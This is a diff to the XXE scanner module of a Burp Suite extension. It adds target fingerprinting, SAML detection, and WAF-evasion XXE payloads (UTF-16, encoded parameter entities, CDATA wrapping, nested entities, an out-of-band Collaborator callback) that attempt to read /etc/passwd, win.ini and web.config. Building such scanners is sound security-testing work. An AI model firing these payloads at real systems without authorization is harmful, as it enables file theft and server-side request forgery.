@@ -2,6 +2,7 @@ package com.omnistrike.modules.injection;
 
 import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.collaborator.Interaction;
+import burp.api.montoya.core.ByteArray;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.requests.HttpRequest;
@@ -536,11 +537,18 @@ public class XxeScanner implements ScanModule {
         boolean isXmlRequest = isXmlContentType(contentType);
         boolean isJsonRequest = contentType != null && contentType.contains("application/json");
 
+        // Fingerprint the target to tailor payloads (OS + runtime detection)
+        TargetFingerprint fingerprint = fingerprint(requestResponse);
+        if (fingerprint.os != DetectedOS.UNKNOWN || fingerprint.runtime != DetectedRuntime.UNKNOWN) {
+            api.logging().logToOutput("[XXE] Fingerprint: OS=" + fingerprint.os
+                    + " Runtime=" + fingerprint.runtime + " for " + url);
+        }
+
         // Phase 1: If the request body is already XML, test the XML body directly
         if (isXmlRequest) {
             if (dedup.markIfNew("xxe-scanner", urlPath, "__xml_body__")) {
                 try {
-                    testXmlBody(requestResponse, url);
+                    testXmlBody(requestResponse, url, fingerprint);
                 } catch (Exception e) {
                     api.logging().logToError("XXE XML body test error: " + e.getMessage());
                 }
@@ -639,6 +647,32 @@ public class XxeScanner implements ScanModule {
                         .build());
             }
         }
+
+        // Detect SAML XML context (high-value XXE target)
+        boolean hasSamlParam = false;
+        for (var param : request.parameters()) {
+            if ("SAMLRequest".equalsIgnoreCase(param.name())
+                    || "SAMLResponse".equalsIgnoreCase(param.name())) {
+                hasSamlParam = true;
+                break;
+            }
+        }
+        if (hasSamlParam
+                || (body != null && body.contains("urn:oasis:names:tc:SAML"))
+                || (body != null && (body.contains("samlp:") || body.contains("saml2p:")))) {
+            findingsStore.addFinding(Finding.builder("xxe-scanner",
+                            "SAML XML context detected",
+                            Severity.INFO, Confidence.CERTAIN)
+                    .url(url).parameter(hasSamlParam ? "SAMLRequest/SAMLResponse" : "request_body")
+                    .evidence("SAML protocol detected — XML-based authentication flow")
+                    .description("This endpoint handles SAML XML messages. SAML processors are a common "
+                            + "target for XXE injection because they must parse untrusted XML. "
+                            + "If the SAML library does not disable external entity processing, "
+                            + "XXE attacks can extract sensitive data or perform SSRF. "
+                            + "Test this endpoint with both classic and OOB XXE payloads.")
+                    .requestResponse(requestResponse)
+                    .build());
+        }
     }
 
     // ==================== PHASE 1: XML BODY TESTING ====================
@@ -647,7 +681,8 @@ public class XxeScanner implements ScanModule {
      * Tests XXE injection when the request already has an XML content type.
      * Applies classic file read, error-based, and blind OOB payloads to the XML body.
      */
-    private void testXmlBody(HttpRequestResponse original, String url) throws InterruptedException {
+    private void testXmlBody(HttpRequestResponse original, String url,
+                              TargetFingerprint fingerprint) throws InterruptedException {
         String requestBody = original.request().bodyToString();
         if (requestBody == null || requestBody.trim().isEmpty()) return;
 
@@ -656,24 +691,46 @@ public class XxeScanner implements ScanModule {
         String baselineBody = (baseline != null && baseline.response() != null)
                 ? baseline.response().bodyToString() : "";
 
-        // Determine if this is SOAP
+        // Determine XML context
         boolean isSoap = requestBody.contains("<soap:") || requestBody.contains("<SOAP-ENV:")
                 || requestBody.contains("soap:Envelope") || requestBody.contains("soapenv:");
 
-        // Phase 1a: Classic XXE file read
-        if (config.getBool("xxe.classic.enabled", true)) {
-            testClassicXxeFileRead(original, url, requestBody, baselineBody, isSoap);
+        // Detect if endpoint is blind (doesn't reflect XML content).
+        // Blind endpoints can't yield classic file-read results — those would be
+        // false positives from incidental response differences. Prioritize OOB instead.
+        boolean blind = isBlindEndpoint(original, requestBody);
+        if (blind) {
+            api.logging().logToOutput("[XXE] Endpoint appears blind — prioritizing OOB, skipping classic file read.");
         }
 
-        // Phase 1b: Error-based XXE
-        if (config.getBool("xxe.classic.enabled", true)) {
-            testErrorBasedXxe(original, url, requestBody, baselineBody);
+        if (blind) {
+            // Blind endpoint: error-based first (cheap, reveals parser), then OOB (primary)
+            if (config.getBool("xxe.classic.enabled", true)) {
+                testErrorBasedXxe(original, url, requestBody, baselineBody);
+            }
+            if (config.getBool("xxe.oob.enabled", true)
+                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
+                testBlindXxeOob(original, url, requestBody);
+            }
+        } else {
+            // Reflective endpoint: classic file read is viable (fingerprint-aware)
+            if (config.getBool("xxe.classic.enabled", true)) {
+                testClassicXxeFileRead(original, url, requestBody, baselineBody, isSoap, fingerprint);
+            }
+            if (config.getBool("xxe.classic.enabled", true)) {
+                testErrorBasedXxe(original, url, requestBody, baselineBody);
+            }
+            if (config.getBool("xxe.oob.enabled", true)
+                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
+                testBlindXxeOob(original, url, requestBody);
+            }
         }
 
-        // Phase 1c: Blind XXE via OOB (Collaborator)
-        if (config.getBool("xxe.oob.enabled", true)
-                && collaboratorManager != null && collaboratorManager.isAvailable()) {
-            testBlindXxeOob(original, url, requestBody);
+        // Bypass phases: UTF-16 encoding and double-encoded entities
+        // These run regardless of blind/reflective since they test filter evasion
+        if (config.getBool("xxe.bypass.enabled", true)) {
+            testUtf16Bypass(original, url, baselineBody, fingerprint);
+            testDoubleEncodedBypass(original, url, requestBody, baselineBody, fingerprint);
         }
     }
 
@@ -685,25 +742,26 @@ public class XxeScanner implements ScanModule {
      */
     private void testClassicXxeFileRead(HttpRequestResponse original, String url,
                                          String requestBody, String baselineBody,
-                                         boolean isSoap) throws InterruptedException {
-        // Test Linux targets
-        for (String[] target : LINUX_FILE_TARGETS) {
-            String filePath = target[0];
-            String evidencePattern = target[1];
-            String description = target[2];
+                                         boolean isSoap,
+                                         TargetFingerprint fingerprint) throws InterruptedException {
+        // Fingerprint-aware target selection:
+        //   Known OS   → full file list for that OS only (skip the irrelevant OS entirely)
+        //   Unknown OS → minimal high-confidence subset from both (3 files each)
+        // This dramatically reduces requests and eliminates cross-OS false positives.
+        String[][] linuxTargets = getLinuxTargets(fingerprint);
+        String[][] windowsTargets = getWindowsTargets(fingerprint);
 
+        api.logging().logToOutput("[XXE] File read targets: " + linuxTargets.length
+                + " Linux + " + windowsTargets.length + " Windows (OS=" + fingerprint.os + ")");
+
+        for (String[] target : linuxTargets) {
             testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
-                    filePath, evidencePattern, description, "Linux");
+                    target[0], target[1], target[2], "Linux");
         }
 
-        // Test Windows targets
-        for (String[] target : WINDOWS_FILE_TARGETS) {
-            String filePath = target[0];
-            String evidencePattern = target[1];
-            String description = target[2];
-
+        for (String[] target : windowsTargets) {
             testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
-                    filePath, evidencePattern, description, "Windows");
+                    target[0], target[1], target[2], "Windows");
         }
     }
 
@@ -1233,6 +1291,332 @@ public class XxeScanner implements ScanModule {
         findingsStore.addFinding(builder.build());
         api.logging().logToOutput("[XXE OOB] Confirmed! " + technique + " at " + url
                 + " | " + interaction.type().name() + " from " + interaction.clientIp());
+    }
+
+    // ==================== PHASE 1d: UTF-16 ENCODING BYPASS ====================
+
+    /**
+     * Tests XXE payloads encoded in UTF-16 to bypass WAFs and parsers that only
+     * inspect UTF-8 content. Some XML parsers honor the encoding declaration and
+     * process UTF-16 encoded payloads even when UTF-8 DOCTYPE patterns are blocked.
+     * Uses fingerprint to choose the right file target (Linux vs Windows).
+     */
+    private void testUtf16Bypass(HttpRequestResponse original, String url,
+                                  String baselineBody,
+                                  TargetFingerprint fingerprint) throws InterruptedException {
+
+        // Select file targets based on fingerprint
+        String linuxFile = "/etc/passwd";
+        Pattern linuxEvidence = LINUX_PASSWD_EVIDENCE;
+        String winFile = "C:/Windows/win.ini";
+        Pattern winEvidence = WINDOWS_WIN_INI_EVIDENCE;
+
+        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
+        boolean testWindows = fingerprint.os != DetectedOS.LINUX;
+
+        // UTF-16 LE with BOM — Linux target
+        if (testLinux) {
+            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
+                    "UTF-16 LE", "Linux",
+                    new byte[]{(byte) 0xFF, (byte) 0xFE},
+                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
+            perHostDelay();
+        }
+
+        // UTF-16 BE with BOM — Linux target
+        if (testLinux) {
+            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
+                    "UTF-16 BE", "Linux",
+                    new byte[]{(byte) 0xFE, (byte) 0xFF},
+                    java.nio.charset.StandardCharsets.UTF_16BE, "utf-16be");
+            perHostDelay();
+        }
+
+        // UTF-16 LE with BOM — Windows target
+        if (testWindows) {
+            testUtf16Payload(original, url, baselineBody, winFile, winEvidence,
+                    "UTF-16 LE", "Windows",
+                    new byte[]{(byte) 0xFF, (byte) 0xFE},
+                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
+            perHostDelay();
+        }
+
+        // UTF-16 OOB variant (blind) — uses Collaborator if standard UTF-16 didn't yield results
+        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
+            AtomicReference<HttpRequestResponse> sentUtf16Oob = new AtomicReference<>();
+            String collabPayload = collaboratorManager.generatePayload(
+                    "xxe-scanner", url, "xml_body", "XXE OOB via UTF-16 encoding bypass",
+                    interaction -> reportOobFinding(interaction, url,
+                            "UTF-16 encoding bypass OOB", sentUtf16Oob.get()));
+            if (collabPayload != null) {
+                String oobXml = "<?xml version=\"1.0\" encoding=\"UTF-16LE\"?>\n"
+                        + "<!DOCTYPE foo [\n"
+                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload + "/xxe\">\n"
+                        + "  %xxe;\n"
+                        + "]>\n"
+                        + "<foo>test</foo>";
+                try {
+                    byte[] bom = {(byte) 0xFF, (byte) 0xFE};
+                    byte[] xmlBytes = oobXml.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                    byte[] payload = new byte[bom.length + xmlBytes.length];
+                    System.arraycopy(bom, 0, payload, 0, bom.length);
+                    System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);
+
+                    HttpRequest modified = original.request()
+                            .withRemovedHeader("Content-Type")
+                            .withAddedHeader("Content-Type", "application/xml; charset=utf-16le")
+                            .withBody(ByteArray.byteArray(payload));
+                    HttpRequestResponse result = api.http().sendRequest(modified);
+                    sentUtf16Oob.set(result);
+                } catch (Exception e) {
+                    api.logging().logToError("[XXE] UTF-16 OOB test error: " + e.getMessage());
+                }
+            }
+            perHostDelay();
+        }
+    }
+
+    /**
+     * Sends a single UTF-16 encoded XXE file-read payload and checks for evidence.
+     */
+    private void testUtf16Payload(HttpRequestResponse original, String url,
+                                   String baselineBody, String filePath,
+                                   Pattern evidencePattern, String encoding,
+                                   String osType, byte[] bom,
+                                   java.nio.charset.Charset charset, String charsetName) {
+        String xxeXml = "<?xml version=\"1.0\" encoding=\"" + charsetName.toUpperCase() + "\"?>\n"
+                + "<!DOCTYPE foo [\n"
+                + "  <!ENTITY xxe SYSTEM \"file://" + filePath + "\">\n"
+                + "]>\n"
+                + "<foo>&xxe;</foo>";
+        try {
+            byte[] xmlBytes = xxeXml.getBytes(charset);
+            byte[] payload = new byte[bom.length + xmlBytes.length];
+            System.arraycopy(bom, 0, payload, 0, bom.length);
+            System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);
+
+            HttpRequest modified = original.request()
+                    .withRemovedHeader("Content-Type")
+                    .withAddedHeader("Content-Type", "application/xml; charset=" + charsetName)
+                    .withBody(ByteArray.byteArray(payload));
+            HttpRequestResponse result = api.http().sendRequest(modified);
+
+            if (result != null && result.response() != null) {
+                String responseBody = result.response().bodyToString();
+                if (responseBody != null
+                        && evidencePattern.matcher(responseBody).find()
+                        && !evidencePattern.matcher(baselineBody).find()) {
+                    findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                    "XXE via " + encoding + " Encoding Bypass: " + filePath + " (" + osType + ")",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter("xml_body (" + encoding + ")")
+                            .evidence(encoding + " encoded XXE payload bypassed filters and read " + filePath)
+                            .description("XXE injection confirmed using " + encoding + " encoding. The XML "
+                                    + "parser honored the " + encoding + " encoding declaration, bypassing "
+                                    + "any input filters that only inspect UTF-8 content. "
+                                    + "Remediation: Normalize XML encoding before parsing. Disable external entities.")
+                            .requestResponse(result)
+                            .build());
+                }
+            }
+        } catch (Exception e) {
+            api.logging().logToError("[XXE] " + encoding + " " + osType + " test error: " + e.getMessage());
+        }
+    }
+
+    // ==================== PHASE 1e: DOUBLE-ENCODED ENTITY BYPASS ====================
+
+    /**
+     * Tests XXE payloads using double-encoded and alternative entity syntax to bypass
+     * WAFs that filter standard DTD patterns. Techniques:
+     *   - HTML entity encoding of % in parameter entities (&#x25; = %)
+     *   - CDATA wrapping to hide entity references from output filters
+     *   - Nested entity definitions (entity-within-entity)
+     * Uses fingerprint to choose the right file target. All findings require
+     * confirmed file content with baseline comparison to prevent false positives.
+     */
+    private void testDoubleEncodedBypass(HttpRequestResponse original, String url,
+                                          String requestBody, String baselineBody,
+                                          TargetFingerprint fingerprint) throws InterruptedException {
+
+        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
+        boolean testWindows = fingerprint.os != DetectedOS.LINUX;
+
+        // Bypass 1: HTML-encoded % in parameter entity (&#x25; = %)
+        // Some WAFs block "<!ENTITY %" but allow the HTML-encoded form
+        if (testLinux) {
+            String encodedParamEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///etc/passwd\">\n"
+                    + "  &#x25;xxe;\n"
+                    + "]>\n"
+                    + "<foo>test</foo>";
+
+            HttpRequestResponse result1 = sendRawRequest(original, encodedParamEntity);
+            if (result1 != null && result1.response() != null) {
+                String body = result1.response().bodyToString();
+                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
+                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
+                    findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                    "XXE via HTML-Encoded Parameter Entity Bypass: /etc/passwd read",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter("xml_body (encoded &#x25;)")
+                            .evidence("HTML-encoded &#x25; parameter entity bypassed filters — /etc/passwd read")
+                            .description("XXE injection confirmed using HTML entity encoding of the % character "
+                                    + "in parameter entity declarations (&#x25;). This bypasses WAFs that block "
+                                    + "literal '<!ENTITY %' patterns. "
+                                    + "Remediation: Disable DTD processing entirely instead of relying on pattern matching.")
+                            .requestResponse(result1)
+                            .build());
+                    return; // confirmed, skip further bypass tests
+                }
+            }
+            perHostDelay();
+        }
+
+        // Bypass 2: CDATA section wrapping to hide entity expansion from output filters
+        if (testLinux) {
+            String cdataBypass = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ENTITY start \"<![CDATA[\">\n"
+                    + "  <!ENTITY end \"]]>\">\n"
+                    + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+                    + "]>\n"
+                    + "<foo>&start;&xxe;&end;</foo>";
+
+            HttpRequestResponse result2 = sendRawRequest(original, cdataBypass);
+            if (result2 != null && result2.response() != null) {
+                String body = result2.response().bodyToString();
+                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
+                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
+                    findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                    "XXE via CDATA Wrapping Bypass: /etc/passwd read",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter("xml_body (CDATA)")
+                            .evidence("CDATA-wrapped entity references bypassed content filters — /etc/passwd read")
+                            .description("XXE injection confirmed using CDATA section wrapping around entity "
+                                    + "references. This evades output encoding and content inspection. "
+                                    + "Remediation: Disable external entity processing in the XML parser.")
+                            .requestResponse(result2)
+                            .build());
+                    return;
+                }
+            }
+            perHostDelay();
+        }
+
+        // Bypass 3: Nested entity definition (entity defined via another entity)
+        if (testLinux) {
+            String nestedEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ENTITY % a \"<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>\">\n"
+                    + "  %a;\n"
+                    + "  %b;\n"
+                    + "]>\n"
+                    + "<foo>test</foo>";
+
+            HttpRequestResponse result3 = sendRawRequest(original, nestedEntity);
+            if (result3 != null && result3.response() != null) {
+                String body = result3.response().bodyToString();
+                if (body != null) {
+                    boolean hasPasswd = LINUX_PASSWD_EVIDENCE.matcher(body).find()
+                            && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find();
+                    boolean hasDtdError = DTD_PROCESSING_ERROR_PATTERN.matcher(body).find()
+                            && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find();
+
+                    if (hasPasswd) {
+                        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                        "XXE via Nested Entity Bypass: /etc/passwd read",
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(url).parameter("xml_body (nested entities)")
+                                .evidence("Nested entity definition bypass succeeded — /etc/passwd content returned")
+                                .description("XXE injection confirmed via nested parameter entity definitions. "
+                                        + "Remediation: Disable DTD processing entirely.")
+                                .requestResponse(result3)
+                                .build());
+                        return;
+                    } else if (hasDtdError) {
+                        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                        "XXE Nested Entity Processing Detected",
+                                        Severity.HIGH, Confidence.FIRM)
+                                .url(url).parameter("xml_body (nested entities)")
+                                .evidence("Nested entity definitions triggered DTD processing errors not in baseline")
+                                .description("The XML parser attempted to process nested parameter entity "
+                                        + "definitions, confirming DTD processing is active. While file content "
+                                        + "was not directly returned, this confirms the parser is vulnerable. "
+                                        + "Remediation: Disable DTD processing entirely.")
+                                .requestResponse(result3)
+                                .build());
+                    }
+                }
+            }
+            perHostDelay();
+        }
+
+        // Bypass 4: Windows targets with text/xml Content-Type bypass
+        if (testWindows) {
+            String winEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
+                    + "]>\n"
+                    + "<foo>&xxe;</foo>";
+
+            HttpRequest winBypassReq = original.request()
+                    .withRemovedHeader("Content-Type")
+                    .withAddedHeader("Content-Type", "text/xml")
+                    .withBody(winEntity);
+            try {
+                HttpRequestResponse result4 = api.http().sendRequest(winBypassReq);
+                if (result4 != null && result4.response() != null) {
+                    String body = result4.response().bodyToString();
+                    if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
+                            && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
+                        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                        "XXE via Content-Type text/xml Bypass: win.ini read",
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(url).parameter("xml_body (text/xml)")
+                                .evidence("text/xml Content-Type bypass succeeded — win.ini content returned")
+                                .description("XXE injection confirmed using text/xml Content-Type header. "
+                                        + "The server accepted XML via text/xml even though the original "
+                                        + "Content-Type may have been application/xml. "
+                                        + "Remediation: Enforce strict Content-Type validation and disable external entities.")
+                                .requestResponse(result4)
+                                .build());
+                    }
+                }
+            } catch (Exception e) {
+                api.logging().logToError("[XXE] Content-Type bypass test error: " + e.getMessage());
+            }
+            perHostDelay();
+        }
+
+        // Bypass 5: HTML-encoded % for Windows target
+        if (testWindows) {
+            String encodedWinEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE foo [\n"
+                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
+                    + "  &#x25;xxe;\n"
+                    + "]>\n"
+                    + "<foo>test</foo>";
+
+            HttpRequestResponse result5 = sendRawRequest(original, encodedWinEntity);
+            if (result5 != null && result5.response() != null) {
+                String body = result5.response().bodyToString();
+                if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
+                        && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
+                    findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                    "XXE via HTML-Encoded Parameter Entity Bypass: win.ini read",
+                                    Severity.CRITICAL, Confidence.CERTAIN)
+                            .url(url).parameter("xml_body (encoded &#x25;)")
+                            .evidence("HTML-encoded &#x25; parameter entity bypass — win.ini content returned")
+                            .description("XXE injection confirmed using HTML entity encoding of % on a Windows "
+                                    + "target. Remediation: Disable DTD processing entirely.")
+                            .requestResponse(result5)
+                            .build());
+                }
+            }
+            perHostDelay();
+        }
     }
 
     // ==================== PHASE 2: XINCLUDE INJECTION ====================
@@ -1896,10 +2280,150 @@ public class XxeScanner implements ScanModule {
         if (delay > 0) Thread.sleep(delay);
     }
 
+    // ==================== TARGET FINGERPRINTING ====================
+
+    /** Minimal probe targets for unknown OS — only files with strong evidence patterns. */
+    private static final String[][] PROBE_LINUX_TARGETS = {
+            {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
+            {"/proc/version", "Linux version", "/proc/version"},
+            {"/etc/os-release", "NAME=", "/etc/os-release"},
+    };
+
+    private static final String[][] PROBE_WINDOWS_TARGETS = {
+            {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
+            {"C:/boot.ini", "[boot loader]", "C:\\boot.ini"},
+            {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
+    };
+
+    /**
+     * Inspects response headers and body to determine the target's OS and runtime.
+     * Reduces irrelevant requests and false positives by tailoring payloads.
+     */
+    private TargetFingerprint fingerprint(HttpRequestResponse requestResponse) {
+        HttpResponse response = requestResponse.response();
+        if (response == null) return new TargetFingerprint(DetectedOS.UNKNOWN, DetectedRuntime.UNKNOWN);
+
+        DetectedOS os = DetectedOS.UNKNOWN;
+        DetectedRuntime runtime = DetectedRuntime.UNKNOWN;
+
+        for (var h : response.headers()) {
+            String name = h.name().toLowerCase();
+            String value = h.value().toLowerCase();
+
+            if (name.equals("server")) {
+                if (value.contains("microsoft") || value.contains("iis")) {
+                    os = DetectedOS.WINDOWS;
+                } else if (value.contains("apache") || value.contains("nginx")
+                        || value.contains("ubuntu") || value.contains("debian")
+                        || value.contains("centos") || value.contains("unix")) {
+                    os = DetectedOS.LINUX;
+                }
+                if (value.contains("tomcat") || value.contains("jetty") || value.contains("jboss")
+                        || value.contains("wildfly") || value.contains("weblogic")
+                        || value.contains("websphere") || value.contains("glassfish")) {
+                    runtime = DetectedRuntime.JAVA;
+                }
+            }
+
+            if (name.equals("x-powered-by")) {
+                if (value.contains("php")) {
+                    runtime = DetectedRuntime.PHP;
+                    if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
+                } else if (value.contains("asp.net")) {
+                    runtime = DetectedRuntime.DOTNET;
+                    os = DetectedOS.WINDOWS;
+                } else if (value.contains("express") || value.contains("node")) {
+                    runtime = DetectedRuntime.NODEJS;
+                } else if (value.contains("servlet")) {
+                    runtime = DetectedRuntime.JAVA;
+                }
+            }
+
+            if (name.equals("x-aspnet-version") || name.equals("x-aspnetmvc-version")) {
+                runtime = DetectedRuntime.DOTNET;
+                os = DetectedOS.WINDOWS;
+            }
+        }
+
+        // Fallback: check response body for technology indicators
+        if (runtime == DetectedRuntime.UNKNOWN) {
+            try {
+                String body = response.bodyToString();
+                if (body != null) {
+                    String lower = body.toLowerCase();
+                    if (lower.contains("javax.") || lower.contains("java.lang.")
+                            || lower.contains("springframework") || lower.contains("at org.apache.")) {
+                        runtime = DetectedRuntime.JAVA;
+                    } else if (lower.contains("__viewstate") || lower.contains("asp.net")
+                            || lower.contains("system.web")) {
+                        runtime = DetectedRuntime.DOTNET;
+                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.WINDOWS;
+                    } else if (lower.contains("php warning") || lower.contains("php error")
+                            || lower.contains("php fatal") || lower.contains("simplexml")) {
+                        runtime = DetectedRuntime.PHP;
+                        if (os == DetectedOS.UNKNOWN) os = DetectedOS.LINUX;
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+
+        return new TargetFingerprint(os, runtime);
+    }
+
+    /**
+     * Returns Linux file targets filtered by fingerprint.
+     * Known Windows → empty. Known Linux → full set. Unknown → minimal probes.
+     */
+    private String[][] getLinuxTargets(TargetFingerprint fp) {
+        return switch (fp.os) {
+            case WINDOWS -> new String[0][];
+            case LINUX -> LINUX_FILE_TARGETS;
+            case UNKNOWN -> PROBE_LINUX_TARGETS;
+        };
+    }
+
+    /**
+     * Returns Windows file targets filtered by fingerprint.
+     * Known Linux → empty. Known Windows → full set. Unknown → minimal probes.
+     */
+    private String[][] getWindowsTargets(TargetFingerprint fp) {
+        return switch (fp.os) {
+            case LINUX -> new String[0][];
+            case WINDOWS -> WINDOWS_FILE_TARGETS;
+            case UNKNOWN -> PROBE_WINDOWS_TARGETS;
+        };
+    }
+
+    /**
+     * Checks if the endpoint reflects XML content back in the response.
+     * If not, the endpoint is "blind" — OOB payloads should be prioritized
+     * and classic file read skipped (it would only produce false positives).
+     */
+    private boolean isBlindEndpoint(HttpRequestResponse original, String requestBody) {
+        String probe = "OMNISTRIKE_XXE_REFLECT_" + (System.currentTimeMillis() % 100000);
+        String probeBody = injectEntityReferenceIntoFirstElement(requestBody, probe);
+        HttpRequestResponse probeResult = sendRawRequest(original, probeBody);
+        if (probeResult == null || probeResult.response() == null) return true;
+        String responseBody = probeResult.response().bodyToString();
+        return responseBody == null || !responseBody.contains(probe);
+    }
+
     @Override
     public void destroy() { }
 
     // ==================== INNER TYPES ====================
+
+    private enum DetectedOS { LINUX, WINDOWS, UNKNOWN }
+    private enum DetectedRuntime { JAVA, DOTNET, PHP, PYTHON, RUBY, NODEJS, UNKNOWN }
+
+    private static class TargetFingerprint {
+        final DetectedOS os;
+        final DetectedRuntime runtime;
+        TargetFingerprint(DetectedOS os, DetectedRuntime runtime) {
+            this.os = os;
+            this.runtime = runtime;
+        }
+    }
 
     private enum XxeTargetType { QUERY, BODY, COOKIE, JSON, HEADER }
 
